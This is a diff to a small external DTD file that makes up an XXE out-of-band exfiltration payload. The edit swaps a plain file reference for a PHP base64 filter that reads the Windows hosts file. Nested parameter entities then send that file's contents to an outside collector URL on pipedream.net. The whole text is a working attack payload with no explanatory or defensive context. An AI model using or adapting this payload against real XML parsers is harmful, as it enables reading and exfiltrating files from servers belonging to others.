@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file://C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://C:/Windows/System32/drivers/etc/hosts">
 <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'https://eotad3zugug90z.m.pipedream.net/%file;'>">
 %eval;
 %exfiltrate;
